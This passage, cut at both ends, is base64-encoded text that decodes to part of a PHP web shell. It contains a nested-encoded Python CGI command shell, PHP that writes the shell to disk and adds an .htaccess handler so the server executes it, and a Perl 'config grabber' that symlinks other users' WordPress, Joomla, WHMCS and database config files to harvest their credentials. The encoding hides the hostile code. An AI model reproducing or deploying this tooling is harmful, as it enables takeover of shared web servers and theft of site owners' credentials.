WN5NXpkR1J2ZFhRS1puSnZiU0IwYVcxbElHbHRjRzl5ZENCegpkSEptZEdsdFpRcHBiWEJ2Y25RZ2RISmhZMlZpWVdOckNtWnliMjBnVTNSeWFXNW5TVThnYVcxd2IzSjBJRk4wY21sdVowbFBDbVp5CmIyMGdkSEpoWTJWaVlXTnJJR2x0Y0c5eWRDQndjbWx1ZEY5bGVHTUtDaU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWoKSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNS0l5QmpiMjV6ZEdGdWRITUtDbVp2Ym5ScwphVzVsSUQwZ0p6eEdUMDVVSUVOUFRFOVNQU00wTWpReU5ESWdjM1I1YkdVOUltWnZiblF0Wm1GdGFXeDVPblJwYldWek8yWnZiblF0CmMybDZaVG94TW5CME95SStKd3AyWlhKemFXOXVjM1J5YVc1bklEMGdKMVpsY25OcGIyNGdNUzR3TGpBZ04zUm9JRXAxYkhrZ01qQXcKTkNjS0NtbG1JRzl6TG1WdWRtbHliMjR1YUdGelgydGxlU2dpVTBOU1NWQlVYMDVCVFVVaUtUb0tJQ0FnSUhOamNtbHdkRzVoYldVZwpQU0J2Y3k1bGJuWnBjbTl1V3lKVFExSkpVRlJmVGtGTlJTSmRDbVZzYzJVNkNpQWdJQ0J6WTNKcGNIUnVZVzFsSUQwZ0lpSUtDazFGClZFaFBSQ0E5SUNjaVVFOVRWQ0luQ2dvakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWoKSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpDaU1nVUhKcGRtRjBaU0JtZFc1amRHbHZibk1nWVc1a0lIWmhjbWxoWW14bApjd29LWkdWbUlHZGxkR1p2Y20wb2RtRnNkV1ZzYVhOMExDQjBhR1ZtYjNKdExDQnViM1J3Y21WelpXNTBQU2NuS1RvS0lDQWdJQ0lpCklsUm9hWE1nWm5WdVkzUnBiMjRzSUdkcGRtVnVJR0VnUTBkSklHWnZjbTBzSUdWNGRISmhZM1J6SUhSb1pTQmtZWFJoSUdaeWIyMGcKYVhRc0lHSmhjMlZrSUc5dUNpQWdJQ0IyWVd4MVpXeHBjM1FnY0dGemMyVmtJR2x1TGlCQmJua2dibTl1TFhCeVpYTmxiblFnZG1GcwpkV1Z6SUdGeVpTQnpaWFFnZEc4Z0p5Y2dMU0JoYkhSb2IzVm5hQ0IwYUdseklHTmhiaUJpWlNCamFHRnVaMlZrTGdvZ0lDQWdLR1V1Clp5NGdkRzhnY21WMGRYSnVJRTV2Ym1VZ2MyOGdlVzkxSUdOaGJpQjBaWE4wSUdadmNpQnRhWE56YVc1bklHdGxlWGR2Y21SeklDMGcKZDJobGNtVWdKeWNnYVhNZ1lTQjJZV3hwWkNCaGJuTjNaWElnWW5WMElIUnZJR2hoZG1VZ2RHaGxJR1pwWld4a0lHMXBjM05wYm1jZwphWE51SjNRdUtTSWlJZ29nSUNBZ1pHRjBZU0E5SUh0OUNpQWdJQ0JtYjNJZ1ptbGxiR1FnYVc0Z2RtRnNkV1ZzYVhOME9nb2dJQ0FnCklDQWdJR2xtSUc1dmRDQjBhR1ZtYjNKdExtaGhjMTlyWlhrb1ptbGxiR1FwT2dvZ0lDQWdJQ0FnSUNBZ0lDQmtZWFJoVzJacFpXeGsKWFNBOUlHNXZkSEJ5WlhObGJuUUtJQ0FnSUNBZ0lDQmxiSE5sT2dvZ0lDQWdJQ0FnSUNBZ0lDQnBaaUFnZEhsd1pTaDBhR1ZtYjNKdApXMlpwWld4a1hTa2dJVDBnZEhsd1pTaGJYU2s2Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JrWVhSaFcyWnBaV3hrWFNBOUlIUm9aV1p2CmNtMWJabWxsYkdSZExuWmhiSFZsQ2lBZ0lDQWdJQ0FnSUNBZ0lHVnNjMlU2Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0IyWVd4MVpYTWcKUFNCdFlYQW9iR0Z0WW1SaElIZzZJSGd1ZG1Gc2RXVXNJSFJvWldadmNtMWJabWxsYkdSZEtTQWdJQ0FnSXlCaGJHeHZkM01nWm05eQpJR3hwYzNRZ2RIbHdaU0IyWVd4MVpYTUtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lHUmhkR0ZiWm1sbGJHUmRJRDBnZG1Gc2RXVnpDaUFnCklDQnlaWFIxY200Z1pHRjBZUW9LQ25Sb1pXWnZjbTFvWldGa0lEMGdJaUlpUEVoVVRVdytQRWhGUVVRK1BGUkpWRXhGUG1ObmFTMXoKYUdWc2JDNXdlU0F0SUdFZ1EwZEpJR0o1SUVaMWVucDViV0Z1UEM5VVNWUk1SVDQ4TDBoRlFVUStDanhDVDBSWlBqeERSVTVVUlZJKwpDanhJTVQ1WFpXeGpiMjFsSUhSdklHTm5hUzF6YUdWc2JDNXdlU0F0SUR4Q1VqNWhJRkI1ZEdodmJpQkRSMGs4TDBneFBnbzhRajQ4ClNUNUNlU0JHZFhwNmVXMWhiand2UWo0OEwwaytQRUpTUGdvaUlpSXJabTl1ZEd4cGJtVWdLeUpXWlhKemFXOXVJRG9nSWlBcklIWmwKY25OcGIyNXpkSEpwYm1jZ0t5QWlJaUlzSUZKMWJtNXBibWNnYjI0Z09pQWlJaUlnS3lCemRISm1kR2x0WlNnbkpVazZKVTBnSlhBcwpJQ1ZCSUNWa0lDVkNMQ0FsV1NjcEt5Y3VQQzlEUlU1VVJWSStQRUpTUGljS0NuUm9aV1p2Y20wZ1BTQWlJaUk4U0RJK1JXNTBaWElnClEyOXRiV0Z1WkR3dlNESStDanhHVDFKTklFMUZWRWhQUkQxY0lpSWlJaUFySUUxRlZFaFBSQ0FySUNjaUlHRmpkR2x2YmowaUp5QXIKSUhOamNtbHdkRzVoYldVZ0t5QWlJaUpjSWo0S1BHbHVjSFYwSUc1aGJXVTlZMjFrSUhSNWNHVTlkR1Y0ZEQ0OFFsSStDanhwYm5CMQpkQ0IwZVhCbFBYTjFZbTFwZENCMllXeDFaVDBpVTNWaWJXbDBJajQ4UWxJK0Nqd3ZSazlTVFQ0OFFsSStQRUpTUGlJaUlncGliMlI1ClpXNWtJRDBnSnp3dlFrOUVXVDQ4TDBoVVRVdytKd3BsY25KdmNtMWxjM01nUFNBblBFTkZUbFJGVWo0OFNESStVMjl0WlhSb2FXNW4KSUZkbGJuUWdWM0p2Ym1jOEwwZ3lQanhDVWo0OFVGSkZQaWNLQ2lNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNagpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TUtJeUJ0WVdsdUlHSnZaSGtnYjJZZ2RHaGxJSE5qCmNtbHdkQW9LYVdZZ1gxOXVZVzFsWDE4Z1BUMGdKMTlmYldGcGJsOWZKem9LSUNBZ0lIQnlhVzUwSUNKRGIyNTBaVzUwTFhSNWNHVTYKSUhSbGVIUXZhSFJ0YkNJZ0lDQWdJQ0FnSUNBaklIUm9hWE1nYVhNZ2RHaGxJR2hsWVdSbGNpQjBieUIwYUdVZ2MyVnlkbVZ5Q2lBZwpJQ0J3Y21sdWRDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0l5QnpieUJwY3lCMGFHbHpJR0pzCllXNXJJR3hwYm1VS0lDQWdJR1p2Y20wZ1BTQmpaMmt1Um1sbGJHUlRkRzl5WVdkbEtDa0tJQ0FnSUdSaGRHRWdQU0JuWlhSbWIzSnQKS0ZzblkyMWtKMTBzWm05eWJTa0tJQ0FnSUhSb1pXTnRaQ0E5SUdSaGRHRmJKMk50WkNkZENpQWdJQ0J3Y21sdWRDQjBhR1ZtYjNKdAphR1ZoWkFvZ0lDQWdjSEpwYm5RZ2RHaGxabTl5YlFvZ0lDQWdhV1lnZEdobFkyMWtPZ29nSUNBZ0lDQWdJSEJ5YVc1MElDYzhTRkkrClBFSlNQanhDVWo0bkNpQWdJQ0FnSUNBZ2NISnBiblFnSnp4Q1BrTnZiVzFoYm1RZ09pQW5MQ0IwYUdWamJXUXNJQ2M4UWxJK1BFSlMKUGljS0lDQWdJQ0FnSUNCd2NtbHVkQ0FuVW1WemRXeDBJRG9nUEVKU1BqeENVajRuQ2lBZ0lDQWdJQ0FnZEhKNU9nb2dJQ0FnSUNBZwpJQ0FnSUNCamFHbHNaRjl6ZEdScGJpd2dZMmhwYkdSZmMzUmtiM1YwSUQwZ2IzTXVjRzl3Wlc0eUtIUm9aV050WkNrS0lDQWdJQ0FnCklDQWdJQ0FnWTJocGJHUmZjM1JrYVc0dVkyeHZjMlVvS1FvZ0lDQWdJQ0FnSUNBZ0lDQnlaWE4xYkhRZ1BTQmphR2xzWkY5emRHUnYKZFhRdWNtVmhaQ2dwQ2lBZ0lDQWdJQ0FnSUNBZ0lHTm9hV3hrWDNOMFpHOTFkQzVqYkc5elpTZ3BDaUFnSUNBZ0lDQWdJQ0FnSUhCeQphVzUwSUhKbGMzVnNkQzV5WlhCc1lXTmxLQ2RjYmljc0lDYzhRbEkrSnlrS0NpQWdJQ0FnSUNBZ1pYaGpaWEIwSUVWNFkyVndkR2x2CmJpd2daVG9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0l5QmhiaUJsY25KdmNpQnBiaUJsZUdWamRYUnBibWNnZEdobElHTnYKYlcxaGJtUUtJQ0FnSUNBZ0lDQWdJQ0FnY0hKcGJuUWdaWEp5YjNKdFpYTnpDaUFnSUNBZ0lDQWdJQ0FnSUdZZ1BTQlRkSEpwYm1kSgpUeWdwQ2lBZ0lDQWdJQ0FnSUNBZ0lIQnlhVzUwWDJWNFl5aG1hV3hsUFdZcENpQWdJQ0FnSUNBZ0lDQWdJR0VnUFNCbUxtZGxkSFpoCmJIVmxLQ2t1YzNCc2FYUnNhVzVsY3lncENpQWdJQ0FnSUNBZ0lDQWdJR1p2Y2lCc2FXNWxJR2x1SUdFNkNpQWdJQ0FnSUNBZ0lDQWcKSUNBZ0lDQndjbWx1ZENCc2FXNWxDZ29nSUNBZ2NISnBiblFnWW05a2VXVnVaQW9LQ2lJaUlncFVUMFJQTDBsVFUxVkZVd29LQ2dwRApTRUZPUjBWTVQwY0tDakEzTFRBM0xUQTBJQ0FnSUNBZ0lDQldaWEp6YVc5dUlERXVNQzR3Q2tFZ2RtVnllU0JpWVhOcFl5QnplWE4wClpXMGdabTl5SUdWNFpXTjFkR2x1WnlCemFHVnNiQ0JqYjIxdFlXNWtjeTRLU1NCdFlYa2daWGh3WVc1a0lHbDBJR2x1ZEc4Z1lTQncKY205d1pYSWdKMlZ1ZG1seWIyNXRaVzUwSnlCM2FYUm9JSE5sYzNOcGIyNGdjR1Z5YzJsemRHVnVZMlV1TGk0S0lpSWknOwoKJGZpbGUgPSBmb3BlbigicHl0aG9uLml6byIgLCJ3KyIpOwokd3JpdGUgPSBmd3JpdGUgKCRmaWxlICxiYXNlNjRfZGVjb2RlKCRweXRob25wKSk7CmZjbG9zZSgkZmlsZSk7CiAgICBjaG1vZCgicHl0aG9uLml6byIsMDc1NSk7CiAgIGVjaG8gIjxpZnJhbWUgc3JjPXB5dGhvbi9weXRob24uaXpvIHdpZHRoPTEwMCUgaGVpZ2h0PTEwMCUgZnJhbWVib3JkZXI9MD48L2lmcmFtZT4gIjsKfQppZiAoaXNzZXQoJF9QT1NUWydTdWJtaXQxMSddKSkKewogICAgbWtkaXIoJ2FsbGNvbmZpZycsIDA3NTUpOwogICAgY2hkaXIoJ2FsbGNvbmZpZycpOwogICAgICAgICRrb2tkb3N5YSA9ICIuaHRhY2Nlc3MiOwogICAgICAgICRkb3N5YV9hZGkgPSAiJGtva2Rvc3lhIjsKICAgICAgICAkZG9zeWEgPSBmb3BlbiAoJGRvc3lhX2FkaSAsICd3Jykgb3IgZGllICgiRG9zeWEgYcOnxLFsYW1hZMSxISIpOwogICAgICAgICRtZXRpbiA9ICJBZGRIYW5kbGVyIGNnaS1zY3JpcHQgLml6byI7ICAgIAogICAgICAgIGZ3cml0ZSAoICRkb3N5YSAsICRtZXRpbiApIDsKICAgICAgICBmY2xvc2UgKCRkb3N5YSk7CiRjb25maWdzaGVsbCA9ICdJeUV2ZFhOeUwySnBiaTl3WlhKc0lDMUpMM1Z6Y2k5c2IyTmhiQzlpWVc1a2JXbHVDbkJ5YVc1MElDSkRiMjUwWlc1MExYUjVjR1U2SUhSbGVIUXZhSFJ0YkZ4dVhHNGlPd3B3Y21sdWRDYzhJVVJQUTFSWlVFVWdhSFJ0YkNCUVZVSk1TVU1nSWkwdkwxY3pReTh2UkZSRUlGaElWRTFNSURFdU1DQlVjbUZ1YzJsMGFXOXVZV3d2TDBWT0lpQWlhSFIwY0RvdkwzZDNkeTUzTXk1dmNtY3ZWRkl2ZUdoMGJXd3hMMFJVUkM5NGFIUnRiREV0ZEhKaGJuTnBkR2x2Ym1Gc0xtUjBaQ0krQ2p4b2RHMXNJSGh0Ykc1elBTSm9kSFJ3T2k4dmQzZDNMbmN6TG05eVp5OHhPVGs1TDNob2RHMXNJajRLUEdobFlXUStDanh0WlhSaElHaDBkSEF0WlhGMWFYWTlJa052Ym5SbGJuUXRUR0Z1WjNWaFoyVWlJR052Ym5SbGJuUTlJbVZ1TFhWeklpQXZQZ284YldWMFlTQm9kSFJ3TFdWeGRXbDJQU0pEYjI1MFpXNTBMVlI1Y0dVaUlHTnZiblJsYm5ROUluUmxlSFF2YUhSdGJEc2dZMmhoY25ObGREMTFkR1l0T0NJZ0x6NEtQSFJwZEd4bFBsdCtYU0JEZVdJemNpMUVXaUJEYjI1bWFXY2dMU0JiZmwwZ1BDOTBhWFJzWlQ0S1BITjBlV3hsSUhSNWNHVTlJblJsZUhRdlkzTnpJajRLTG01bGQxTjBlV3hsTVNCN0NpQm1iMjUwTFdaaGJXbHNlVG9nVkdGb2IyMWhPd29nWm05dWRDMXphWHBsT2lCNExYTnRZV3hzT3dvZ1ptOXVkQzEzWldsbmFIUTZJR0p2YkdRN0NpQmpiMnh2Y2pvZ0l6QXdSa1pHUmpzS0lDQjBaWGgwTFdGc2FXZHVPaUJqWlc1MFpYSTdDbjBLUEM5emRIbHNaVDRLUEM5b1pXRmtQZ29uT3dwemRXSWdiR2xzZXdvZ0lDQWdLQ1IxYzJWeUtTQTlJRUJmT3dva2JYTnlJRDBnY1hoN2NIZGtmVHNLSkd0dmJHRTlKRzF6Y2k0aUx5SXVKSFZ6WlhJN0NpUnJiMnhoUFg1ekwxeHVMeTluT3lBS2MzbHRiR2x1YXlnbkwyaHZiV1V2Snk0a2RYTmxjaTRuTDNCMVlteHBZMTlvZEcxc0wybHVZMngxWkdWekwyTnZibVpwWjNWeVpTNXdhSEFuTENScmIyeGhMaWN0YzJodmNDNTBlSFFuS1RzS2MzbHRiR2x1YXlnbkwyaHZiV1V2Snk0a2RYTmxjaTRuTDNCMVlteHBZMTlvZEcxc0wyRnRaVzFpWlhJdlkyOXVabWxuTG1sdVl5NXdhSEFuTENScmIyeGhMaWN0WVcxbGJXSmxjaTUwZUhRbktUc0tjM2x0YkdsdWF5Z25MMmh2YldVdkp5NGtkWE5sY2k0bkwzQjFZbXhwWTE5b2RHMXNMMk52Ym1acFp5NXBibU11Y0dod0p5d2thMjlzWVM0bkxXRnRaVzFpWlhJeUxuUjRkQ2NwT3dwemVXMXNhVzVyS0NjdmFHOXRaUzhuTGlSMWMyVnlMaWN2Y0hWaWJHbGpYMmgwYld3dmJXVnRZbVZ5Y3k5amIyNW1hV2QxY21GMGFXOXVMbkJvY0Njc0pHdHZiR0V1SnkxdFpXMWlaWEp6TG5SNGRDY3BPd3B6ZVcxc2FXNXJLQ2N2YUc5dFpTOG5MaVIxYzJWeUxpY3ZjSFZpYkdsalgyaDBiV3d2WTI5dVptbG5MbkJvY0Njc0pHdHZiR0V1SnpJdWRIaDBKeWs3Q25ONWJXeHBibXNvSnk5b2IyMWxMeWN1SkhWelpYSXVKeTl3ZFdKc2FXTmZhSFJ0YkM5bWIzSjFiUzlwYm1Oc2RXUmxjeTlqYjI1bWFXY3VjR2h3Snl3a2EyOXNZUzRuTFdadmNuVnRMblI0ZENjcE93cHplVzFzYVc1cktDY3ZhRzl0WlM4bkxpUjFjMlZ5TGljdmNIVmliR2xqWDJoMGJXd3ZZV1J0YVc0dlkyOXVaaTV3YUhBbkxDUnJiMnhoTGljMUxuUjRkQ2NwT3dwemVXMXNhVzVyS0NjdmFHOXRaUzhuTGlSMWMyVnlMaWN2Y0hWaWJHbGpYMmgwYld3dllXUnRhVzR2WTI5dVptbG5MbkJvY0Njc0pHdHZiR0V1SnpRdWRIaDBKeWs3Q25ONWJXeHBibXNvSnk5b2IyMWxMeWN1SkhWelpYSXVKeTl3ZFdKc2FXTmZhSFJ0YkM5M2NDMWpiMjVtYVdjdWNHaHdKeXdrYTI5c1lTNG5MWGR3TVRNdWRIaDBKeWs3Q25ONWJXeHBibXNvSnk5b2IyMWxMeWN1SkhWelpYSXVKeTl3ZFdKc2FXTmZhSFJ0YkM5aWJHOW5MM2R3TFdOdmJtWnBaeTV3YUhBbkxDUnJiMnhoTGljdGQzQXRZbXh2Wnk1MGVIUW5LVHNLYzNsdGJHbHVheWduTDJodmJXVXZKeTRrZFhObGNpNG5MM0IxWW14cFkxOW9kRzFzTDJOdmJtWmZaMnh2WW1Gc0xuQm9jQ2NzSkd0dmJHRXVKell1ZEhoMEp5azdDbk41Yld4cGJtc29KeTlvYjIxbEx5Y3VKSFZ6WlhJdUp5OXdkV0pzYVdOZmFIUnRiQzlwYm1Oc2RXUmxMMlJpTG5Cb2NDY3NKR3R2YkdFdUp6Y3VkSGgwSnlrN0NuTjViV3hwYm1zb0p5OW9iMjFsTHljdUpIVnpaWEl1Snk5d2RXSnNhV05mYUhSdGJDOWpiMjV1WldOMExuQm9jQ2NzSkd0dmJHRXVKemd1ZEhoMEp5azdDbk41Yld4cGJtc29KeTlvYjIxbEx5Y3VKSFZ6WlhJdUp5OXdkV0pzYVdOZmFIUnRiQzl0YTE5amIyNW1MbkJvY0Njc0pHdHZiR0V1SnprdWRIaDBKeWs3Q25ONWJXeHBibXNvSnk5b2IyMWxMeWN1SkhWelpYSXVKeTl3ZFdKc2FXTmZhSFJ0YkM5cGJtTnNkV1JsTDJOdmJtWnBaeTV3YUhBbkxDUnJiMnhoTGljeE1pNTBlSFFuS1RzS2MzbHRiR2x1YXlnbkwyaHZiV1V2Snk0a2RYTmxjaTRuTDNCMVlteHBZMTlvZEcxc0wycHZiMjFzWVM5amIyNW1hV2QxY21GMGFXOXVMbkJvY0Njc0pHdHZiR0V1SnkxcWIyOXRiR0V1ZEhoMEp5azdDbk41Yld4cGJtc29KeTlvYjIxbEx5Y3VKSFZ6WlhJdUp5OXdkV0pzYVdOZmFIUnRiQzkyWWk5cGJtTnNkV1JsY3k5amIyNW1hV2N1Y0dod0p5d2thMjlzWVM0bkxYWmlMblI0ZENjcE93cHplVzFzYVc1cktDY3ZhRzl0WlM4bkxpUjFjMlZ5TGljdmNIVmliR2xqWDJoMGJXd3ZhVzVqYkhWa1pYTXZZMjl1Wm1sbkxuQm9jQ2NzSkd0dmJHRXVKeTFwYm1Oc2RXUmxjeTEyWWk1MGVIUW5LVHNLYzNsdGJHbHVheWduTDJodmJXVXZKeTRrZFhObGNpNG5MM0IxWW14cFkxOW9kRzFzTDNkb2JTOWpiMjVtYVdkMWNtRjBhVzl1TG5Cb2NDY3NKR3R2YkdFdUp5MTNhRzB4TlM1MGVIUW5LVHNLYzNsdGJHbHVheWduTDJodmJXVXZKeTRrZFhObGNpNG5MM0IxWW14cFkxOW9kRzFzTDNkb2JXTXZZMjl1Wm1sbmRYSmhkR2x2Ymk1d2FIQW5MQ1JyYjJ4aExpY3RkMmh0WXpFMkxuUjRkQ2NwT3dwemVXMXNhVzVyS0NjdmFHOXRaUzhuTGlSMWMyVnlMaWN2Y0hWaWJHbGpYMmgwYld3dmQyaHRZM012WTI5dVptbG5kWEpoZEdsdmJpNXdhSEFuTENScmIyeGhMaWN0ZDJodFkzTXVkSGgwSnlrN0NuTjViV3hwYm1zb0p5OW9iMjFsTHljdUpIVnpaWEl1Snk5d2RXSnNhV05mYUhSdGJDOXpkWEJ3YjNKMEwyTnZibVpwWjNWeVlYUnBiMjR1Y0dod0p5d2thMjlzWVM0bkxYTjFjSEJ2Y25RdWRIaDBKeWs3Q25ONWJXeHBibXNvSnk5b2IyMWxMeWN1SkhWelpYSXVKeTl3ZFdKc2FXTmZhSFJ0YkM5amIyNW1hV2QxY21GMGFXOXVMbkJvY0Njc0pHdHZiR0V1SnpGM2FHMWpjeTUwZUhRbktUc0tjM2x0YkdsdWF5Z25MMmh2YldVdkp5NGtkWE5sY2k0bkwzQjFZbXhwWTE5b2RHMXNMM04xWW0xcGRIUnBZMnRsZEM1d2FIQW5MQ1JyYjJ4aExpY3RkMmh0WTNNeUxuUjRkQ2NwT3dwemVXMXNhVzVyS0NjdmFHOXRaUzhuTGlSMWMyVnlMaWN2Y0hWaWJHbGpYMmgwYld3dlkyeHBaVzUwY3k5amIyNW1hV2QxY21GMGFXOXVMbkJvY0Njc0pHdHZiR0V1SnkxamJHbGxiblJ6TG5SNGRDY3BPd3B6ZVcxc2FXNXJLQ2N2YUc5dFpTOG5MaVIxYzJWeUxpY3ZjSFZpYkdsalgyaDBiV3d2WTJ4cFpXNTBMMk52Ym1acFozVnlZWFJwYjI0dWNHaHdKeXdrYTI5c1lTNG5MV05zYVdWdWRDNTBlSFFuS1RzS2MzbHRiR2x1YXlnbkwyaHZiV1V2Snk0a2RYTmxjaTRuTDNCMVlteHBZMTlvZEcxc0wyTnNhV1Z1ZEdWekwyTnZibVpwWjNWeVlYUnBiMjR1Y0dod0p5d2thMjlzWVM0bkxXTnNhV1Z1ZEhNdWRIaDBKeWs3Q25ONWJXeHBibXNvSnk5b2IyMWxMeWN1SkhWelpYSXVKeTl3ZFdKc2FXTmZhSFJ0YkM5aWFXeHNhVzVuTDJOdmJtWnBaM1Z5WVhScGIyNHVjR2h3Snl3a2EyOXNZUzRuTFdKcGJHeHBibWN1ZEhoMEp5azdJQXB6ZVcxc2FXNXJLQ2N2YUc5dFpTOG5MaVIxYzJWeUxpY3ZjSFZpYkdsalgyaDBiV3d2YldGdVlXZGxMMk52Ym1acFozVnlZWFJwYjI0dWNHaHdKeXdrYTI5c1lTNG5MV0pwYkd4cGJtY3VkSGgwSnlrN0lBcHplVzFzYVc1cktDY3ZhRzl0WlM4bkxpUjFjMlZ5TGljdmNIVmliR2xqWDJoMGJXd3ZiWGt2WTI5dVptbG5kWEpoZEdsdmJpNXdhSEFuTENScmIyeGhMaWN0WW1sc2JHbHVaeTUwZUhRbktUc2dDbk41Yld4cGJtc29KeTlvYjIxbEx5Y3VKSFZ6WlhJdUp5OXdkV0pzYVdOZmFIUnRiQzl0ZVhOb2IzQXZZMjl1Wm1sbmRYSmhkR2x2Ymk1d2FIQW5MQ1JyYjJ4aExpY3RZbWxzYkdsdVp5NTBlSFFuS1RzZ0NuMEthV1lnS0NSRlRsWjdKMUpGVVZWRlUxUmZUVVZVU0U5RUozMGdaWEVnSjFCUFUxUW5LU0I3Q2lBZ2NtVmhaQ2hUVkVSSlRpd2dKR0oxWm1abGNpd2dKRVZPVm5zblEwOU9WRVZPVkY5TVJVNUhWRWduZlNrN0NuMGdaV3h6WlNCN0NpQWdKR0oxWm1abGNpQTlJQ1JGVGxaN0oxRlZSVkpaWDFOVVVrbE9SeWQ5T3dwOUNrQndZV2x5Y3lBOUlITndiR2wwS0M4bUx5d2dKR0oxWm1abGNpazdDbVp2Y21WaFkyZ2dKSEJoYVhJZ0tFQndZV2x5Y3lrZ2V3b2dJQ2drYm1GdFpTd2dKSFpoYkhWbEtTQTlJSE53YkdsMEtDODlMeXdnSkhCaGFYSXBPd29nSUNSdVlXMWxJRDErSUhSeUx5c3ZJQzg3Q2lBZ0pHNWhiV1VnUFg0Z2N5OGxLRnRoTFdaQkxVWXdMVGxkVzJFdFprRXRSakF0T1YwcEwzQmhZMnNvSWtNaUxDQm9aWGdvSkRFcEtTOWxaenNLSUNBa2RtRnNkV1VnUFg0Z2RISXZLeThnTHpzS0lDQWtkbUZzZFdVZ1BYNGdjeThsS0Z0aExXWkJMVVl3TFRsZFcyRXRaa0V0UmpBdE9WMHBMM0JoWTJzb0lrTWlMQ0JvWlhnb0pERXBLUzlsWnpzS0lDQWtSazlTVFhza2JtRnRaWDBnUFNBa2RtRnNkV1U3Q24wS2FXWWdLQ1JHVDFKTmUzQmhjM045SUdWeElDSWlLWHNLY0hKcGJuUWdKd284WW05a2VTQmpiR0Z6Y3owaWJtVjNVM1I1YkdVeElpQmlaMk52Ykc5eVBTSWpNREF3TURBd0lqNEtQSE53WVc0Z2MzUjViR1U5SW5SbGVIUXRaR1ZqYjNKaGRHbHZiam9nYm05dVpTSStQR1p2Ym5RZ1kyOXNiM0k5SWlNd01FWkdNREFpUG5ONWJXeHFibXNnWVd4c0lHTnZibVpwWnp3dlptOXVkRDQ4TDNOd1lXNCtQQzloUGlBS1BHWnZjbTBnYldWMGFHOWtQU0p3YjNOMElqNEtQSFJsZUhSaGNtVmhJRzVoYldVOUluQmhjM01pSUhOMGVXeGxQU0ppYjNKa1pYSTZNWEI0SUdSdmRIUmxaQ0FqTURCR1JrWkdPeUIzYVdSMGFEb2dOVFF6Y0hnN0lHaGxhV2RvZERvZ05ESXdjSGc3SUdKaFkydG5jbTkxYm1RdFkyOXNiM0k2SXpCRE1FTXdRenNnWm05dWRDMW1ZVzFwYkhrNlZHRm9iMjFoT3lCbWIyNTBMWE5wZW1VNk9IQjBPeUJqYjJ4dmNqb2pNREJHUmtaR0lpQWdQand2ZEdWNGRHRnlaV0UrUEdKeUlDOCtDaVp1WW5Od096eHdQZ284YVc1d2RYUWdibUZ0WlQwaWRHRnlJaUIwZVhCbFBTSjBaWGgwSWlCemRIbHNaVDBpWW05eVpHVnlPakZ3ZUNCa2IzUjBaV1FnSXpBd1JrWkdSanNnZDJsa2RHZzZJREl4TW5CNE95QmlZV05yWjNKdmRXNWtMV052Ykc5eU9pTXdRekJETUVNN0lHWnZiblF0Wm1GdGFXeDVPbFJoYUc5dFlUc2dabTl1ZEMxemFYcGxPamh3ZERzZ1kyOXNiM0k2SXpBd1JrWkdSanNnSWlBZ0x6NDhZbklnTHo0S0ptNWljM0E3UEM5d1BnbzhjRDRLUEdsdWNIVjBJRzVoYldVOUlsTjFZbTFwZERFaUlIUjVjR1U5SW5OMVltMXBkQ0lnZG1Gc2RXVTlJa2RsZENCRGIyNW1hV2NpSUhOMGVXeGxQU0ppYjNKa1pYSTZNWEI0SUdSdmRIUmxaQ0FqTURCR1JrWkdPeUIzYVdSMGFEb2dPVGs3SUdadmJuUXRabUZ0YVd4NU9sUmhhRzl0WVRzZ1ptOXVkQzF6YVhwbE9qRXdjSFE3SUdOdmJHOXlPaU13TUVaR1JrWTdJSFJsZUhRdGRISmhibk5tYjNKdE9uVndjR1Z5WTJGelpUc2dhR1ZwWjJoME9qSXpPeUJpWVdOclozSnZkVzVrTFdOdmJHOXlPaU13UXpCRE1FTWlJQzgrUEM5d1BnbzhMMlp2Y20wK0p6c0tmV1ZzYzJWN0NrQnNhVzVsY3lBOVBDUkdUMUpOZTNCaGMzTjlQanNLSkhrZ1BTQkFiR2x1WlhNN0NtOXdaVzRnS0UxWlJrbE1SU3dnSWo1MFlYSXVkRzF3SWlrN0NuQnlhVzUwSUUxWlJrbE1SU0FpZEdGeUlDMWplbVlnSWk0a1JrOVNUWHQwWVhKOUxpSXVkR0Z5SUNJN0NtWnZjaUFvSkd0aFBUQTdKR3RoUENSNU95UnJZU3NyS1hzS2QyaHBiR1VvUUd4cGJtVnpXeVJyWVYwZ0lEMStJRzB2S0M0cVB5azZlRG92WnlsN0NpWnNhV3dvSkRFcE93cHdjbWx1ZENCTldVWkpURVVnSkRFdUlpNTBlSFFnSWpzS1ptOXlLQ1JyWkQweE95UnJaRHd4T0Rza2EyUXJLeWw3Q25CeWFXNTBJRTFaUmtsTVJTQWtNUzRrYTJRdUlpNTBlSFFnSWpzS2ZRcDlDaUI5Q25CeWFXNTBKenhpYjJSNUlHTnNZWE56UFNKdVpYZFRkSGxzWlRFaUlHSm5ZMjlzYjNJOUlpTXdNREF3TURBaVBnbzhjRDVFYjI1bElDRWhQQzl3UGdvOGNENG1ibUp6Y0RzOEwzQStKenNLYVdZb0pFWlBVazE3ZEdGeWZTQnVaU0FpSWlsN0NtOXdaVzRvU1U1R1R5d2dJblJoY2k1MGJYQWlLVHNLUUd4cGJtVnpJRDA4U1U1R1R6NGdPd3BqYkc5elpTaEpUa1pQS1RzS2MzbHpkR1Z0S0VCc2FXNWxjeWs3Q25CeWFXNTBKenh3UGp4aElHaHlaV1k5SWljdUpFWlBVazE3ZEdGeWZTNG5MblJoY2lJK1BHWnZiblFnWTI5c2IzSTlJaU13TUVaR01EQWlQZ284YzNCaGJpQnpkSGxzWlQwaWRHVjRkQzFrWldOdmNtRjBhVzl1T2lCdWIyNWxJajVEYkdsamF5QklaWEpsSUZSdklFUnZkMjVzYjJGa0lGUmhjaUJHYVd4bFBDOXpjR0Z1UGp3dlptOXVkRDQ4TDJFK1BDOXdQaWM3Q24wS2ZRb2djSEpwYm5RaUNqd3ZZbTlrZVQ0S1BDOW9kRzFzUGlJNwonOwoKJGZpbGUgPSBmb3BlbigiY29uZmlnLml6byIg